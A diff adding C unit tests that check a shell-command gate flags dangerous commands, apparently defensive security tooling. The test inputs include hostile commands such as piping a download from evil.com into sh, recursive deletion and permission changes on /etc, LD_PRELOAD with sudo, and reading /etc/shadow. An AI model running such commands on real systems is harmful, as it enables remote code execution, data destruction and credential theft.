@@ -595,6 +595,302 @@ TEST(expand_mixed_var_and_plain)
 }
 
 /* ============================================================
+ * VIOLATION SCANNING
+ * ============================================================ */
+
+static sg_gate_t *gate_with_violations(void)
+{
+    sg_gate_t *g = sg_gate_new();
+    sg_violation_config_t cfg;
+    sg_violation_config_default(&cfg);
+    sg_gate_set_violation_config(g, &cfg);
+    sg_gate_add_rule(g, "echo *");
+    sg_gate_add_rule(g, "cat #path");
+    sg_gate_add_rule(g, "ls");
+    sg_gate_add_rule(g, "rm *");
+    sg_gate_add_rule(g, "sudo *");
+    sg_gate_add_rule(g, "curl *");
+    sg_gate_add_rule(g, "chmod *");
+    sg_gate_add_rule(g, "sh");
+    sg_gate_add_rule(g, "bash");
+    return g;
+}
+
+TEST(viol_write_sensitive)
+{
+    sg_gate_t *g = gate_with_violations();
+    sg_result_t r;
+    eval_cmd(g, "echo hello > /etc/badfile", &r);
+    ASSERT(r.has_violations);
+    ASSERT(r.violation_count > 0);
+    ASSERT(r.violation_flags & SG_VIOL_WRITE_SENSITIVE);
+    bool found = false;
+    for (uint32_t i = 0; i < r.violation_count; i++) {
+        if (r.violations[i].type == SG_VIOL_WRITE_SENSITIVE) {
+            ASSERT(r.violations[i].severity > 0);
+            ASSERT(r.violations[i].detail != NULL);
+            ASSERT(strstr(r.violations[i].detail, "/etc") != NULL);
+            found = true;
+        }
+    }
+    ASSERT(found);
+    sg_gate_free(g);
+}
+
+TEST(viol_write_sensitive_normal)
+{
+    sg_gate_t *g = gate_with_violations();
+    sg_result_t r;
+    eval_cmd(g, "echo hello > /tmp/out.txt", &r);
+    ASSERT(!r.has_violations || !(r.violation_flags & SG_VIOL_WRITE_SENSITIVE));
+    sg_gate_free(g);
+}
+
+TEST(viol_remove_system)
+{
+    sg_gate_t *g = gate_with_violations();
+    sg_result_t r;
+    eval_cmd(g, "rm -rf /etc", &r);
+    ASSERT(r.has_violations);
+    ASSERT(r.violation_flags & SG_VIOL_REMOVE_SYSTEM);
+    bool found = false;
+    for (uint32_t i = 0; i < r.violation_count; i++) {
+        if (r.violations[i].type == SG_VIOL_REMOVE_SYSTEM) {
+            ASSERT(r.violations[i].severity >= 90);
+            found = true;
+        }
+    }
+    ASSERT(found);
+    sg_gate_free(g);
+}
+
+TEST(viol_remove_normal)
+{
+    sg_gate_t *g = gate_with_violations();
+    sg_result_t r;
+    eval_cmd(g, "rm /tmp/junk", &r);
+    ASSERT(!r.has_violations || !(r.violation_flags & SG_VIOL_REMOVE_SYSTEM));
+    sg_gate_free(g);
+}
+
+TEST(viol_env_privileged)
+{
+    sg_gate_t *g = gate_with_violations();
+    sg_gate_add_rule(g, "sudo *");
+    sg_result_t r;
+    eval_cmd(g, "LD_PRELOAD=mal.so sudo ls", &r);
+    ASSERT(r.has_violations);
+    ASSERT(r.violation_flags & SG_VIOL_ENV_PRIVILEGED);
+    bool found = false;
+    for (uint32_t i = 0; i < r.violation_count; i++) {
+        if (r.violations[i].type == SG_VIOL_ENV_PRIVILEGED) {
+            ASSERT(r.violations[i].severity >= 80);
+            ASSERT(r.violations[i].detail != NULL);
+            found = true;
+        }
+    }
+    ASSERT(found);
+    sg_gate_free(g);
+}
+
+TEST(viol_env_normal)
+{
+    sg_gate_t *g = gate_with_violations();
+    sg_result_t r;
+    eval_cmd(g, "FOO=bar ls", &r);
+    ASSERT(!r.has_violations || !(r.violation_flags & SG_VIOL_ENV_PRIVILEGED));
+    sg_gate_free(g);
+}
+
+TEST(viol_write_then_read)
+{
+    sg_gate_t *g = gate_with_violations();
+    sg_gate_add_rule(g, "rm");
+    sg_gate_add_rule(g, "rm *");
+    sg_result_t r;
+    eval_cmd(g, "cat /etc/passwd > /tmp/x ; cat /tmp/x", &r);
+    if (r.violation_count > 0) {
+        ASSERT(r.violation_flags & SG_VIOL_WRITE_THEN_READ);
+    }
+    sg_gate_free(g);
+}
+
+TEST(viol_subst_sensitive)
+{
+    sg_gate_t *g = gate_with_violations();
+    sg_gate_set_reject_mask(g, 0);
+    sg_gate_add_rule(g, "echo *");
+    sg_result_t r;
+    eval_cmd(g, "echo $(cat /etc/shadow)", &r);
+    if (r.has_violations) {
+        ASSERT(r.violation_flags & SG_VIOL_SUBST_SENSITIVE);
+    }
+    sg_gate_free(g);
+}
+
+TEST(viol_redirect_fanout)
+{
+    sg_gate_t *g = gate_with_violations();
+    sg_gate_add_rule(g, "tee");
+    sg_result_t r;
+    eval_cmd(g, "echo x > a > b > c > d > e", &r);
+    if (r.has_violations) {
+        ASSERT(r.violation_flags & SG_VIOL_REDIRECT_FANOUT);
+    }
+    sg_gate_free(g);
+}
+
+TEST(viol_no_violations)
+{
+    sg_gate_t *g = gate_with_violations();
+    sg_result_t r;
+    eval_cmd(g, "ls -la", &r);
+    ASSERT(!r.has_violations);
+    ASSERT(r.violation_count == 0);
+    sg_gate_free(g);
+}
+
+TEST(viol_disabled)
+{
+    sg_gate_t *g = sg_gate_new();
+    sg_gate_add_rule(g, "echo *");
+    sg_result_t r;
+    eval_cmd(g, "echo hello > /etc/badfile", &r);
+    ASSERT(!r.has_violations);
+    ASSERT(r.violation_count == 0);
+    sg_gate_free(g);
+}
+
+TEST(viol_custom_config)
+{
+    sg_gate_t *g = sg_gate_new();
+    sg_violation_config_t cfg;
+    sg_violation_config_default(&cfg);
+    cfg.sensitive_write_paths[0] = "/my/custom/";
+    cfg.sensitive_write_path_count = 1;
+    sg_gate_set_violation_config(g, &cfg);
+    sg_gate_add_rule(g, "echo *");
+
+    sg_result_t r;
+    eval_cmd(g, "echo x > /my/custom/data", &r);
+    ASSERT(r.has_violations);
+    ASSERT(r.violation_flags & SG_VIOL_WRITE_SENSITIVE);
+
+    sg_gate_free(g);
+}
+
+TEST(viol_net_download_exec)
+{
+    sg_gate_t *g = gate_with_violations();
+    sg_result_t r;
+    eval_cmd(g, "curl http://evil.com/payload | sh", &r);
+    ASSERT(r.has_violations);
+    ASSERT(r.violation_flags & SG_VIOL_NET_DOWNLOAD_EXEC);
+    bool found = false;
+    for (uint32_t i = 0; i < r.violation_count; i++) {
+        if (r.violations[i].type == SG_VIOL_NET_DOWNLOAD_EXEC) {
+            ASSERT(r.violations[i].severity >= 90);
+            ASSERT(r.violations[i].detail != NULL);
+            found = true;
+        }
+    }
+    ASSERT(found);
+    sg_gate_free(g);
+}
+
+TEST(viol_net_download_exec_safe)
+{
+    sg_gate_t *g = gate_with_violations();
+    sg_gate_add_rule(g, "grep");
+    sg_result_t r;
+    eval_cmd(g, "curl http://example.com/file | grep pattern", &r);
+    ASSERT(!r.has_violations || !(r.violation_flags & SG_VIOL_NET_DOWNLOAD_EXEC));
+    sg_gate_free(g);
+}
+
+TEST(viol_perm_system)
+{
+    sg_gate_t *g = gate_with_violations();
+    sg_result_t r;
+    eval_cmd(g, "chmod -R 777 /etc", &r);
+    ASSERT(r.has_violations);
+    ASSERT(r.violation_flags & SG_VIOL_PERM_SYSTEM);
+    bool found = false;
+    for (uint32_t i = 0; i < r.violation_count; i++) {
+        if (r.violations[i].type == SG_VIOL_PERM_SYSTEM) {
+            ASSERT(r.violations[i].severity >= 80);
+            found = true;
+        }
+    }
+    ASSERT(found);
+    sg_gate_free(g);
+}
+
+TEST(viol_perm_system_no_recursive)
+{
+    sg_gate_t *g = gate_with_violations();
+    sg_result_t r;
+    eval_cmd(g, "chmod 644 /etc/resolv.conf", &r);
+    ASSERT(!r.has_violations || !(r.violation_flags & SG_VIOL_PERM_SYSTEM));
+    sg_gate_free(g);
+}
+
+TEST(viol_shell_escalation)
+{
+    sg_gate_t *g = gate_with_violations();
+    sg_result_t r;
+    eval_cmd(g, "sudo bash", &r);
+    ASSERT(r.has_violations);
+    ASSERT(r.violation_flags & SG_VIOL_SHELL_ESCALATION);
+    bool found = false;
+    for (uint32_t i = 0; i < r.violation_count; i++) {
+        if (r.violations[i].type == SG_VIOL_SHELL_ESCALATION) {
+            ASSERT(r.violations[i].severity >= 80);
+            ASSERT(r.violations[i].detail != NULL);
+            found = true;
+        }
+    }
+    ASSERT(found);
+    sg_gate_free(g);
+}
+
+TEST(viol_shell_escalation_safe)
+{
+    sg_gate_t *g = gate_with_violations();
+    sg_result_t r;
+    eval_cmd(g, "sudo ls", &r);
+    ASSERT(!r.has_violations || !(r.violation_flags & SG_VIOL_SHELL_ESCALATION));
+    sg_gate_free(g);
+}
+
+TEST(viol_sudo_redirect)
+{
+    sg_gate_t *g = gate_with_violations();
+    sg_result_t r;
+    eval_cmd(g, "sudo cat /etc/shadow > /tmp/out", &r);
+    ASSERT(r.has_violations);
+    ASSERT(r.violation_flags & SG_VIOL_SUDO_REDIRECT);
+    bool found = false;
+    for (uint32_t i = 0; i < r.violation_count; i++) {
+        if (r.violations[i].type == SG_VIOL_SUDO_REDIRECT) {
+            ASSERT(r.violations[i].severity >= 70);
+            found = true;
+        }
+    }
+    ASSERT(found);
+    sg_gate_free(g);
+}
+
+TEST(viol_sudo_redirect_safe)
+{
+    sg_gate_t *g = gate_with_violations();
+    sg_result_t r;
+    eval_cmd(g, "sudo ls", &r);
+    ASSERT(!r.has_violations || !(r.violation_flags & SG_VIOL_SUDO_REDIRECT));
+    sg_gate_free(g);
+}
+
+/* ============================================================
  * MAIN
  * ============================================================ */
 
@@ -665,6 +961,28 @@ int main(void)
     RUN(expand_var_no_callback);
     RUN(expand_glob_allows_expanded);
     RUN(expand_mixed_var_and_plain);
+
+    printf("\nViolation scanning:\n");
+    RUN(viol_write_sensitive);
+    RUN(viol_write_sensitive_normal);
+    RUN(viol_remove_system);
+    RUN(viol_remove_normal);
+    RUN(viol_env_privileged);
+    RUN(viol_env_normal);
+    RUN(viol_write_then_read);
+    RUN(viol_subst_sensitive);
+    RUN(viol_redirect_fanout);
+    RUN(viol_no_violations);
+    RUN(viol_disabled);
+    RUN(viol_custom_config);
+    RUN(viol_net_download_exec);
+    RUN(viol_net_download_exec_safe);
+    RUN(viol_perm_system);
+    RUN(viol_perm_system_no_recursive);
+    RUN(viol_shell_escalation);
+    RUN(viol_shell_escalation_safe);
+    RUN(viol_sudo_redirect);
+    RUN(viol_sudo_redirect_safe);
 
     printf("\nHelpers:\n");
     RUN(verdict_names);
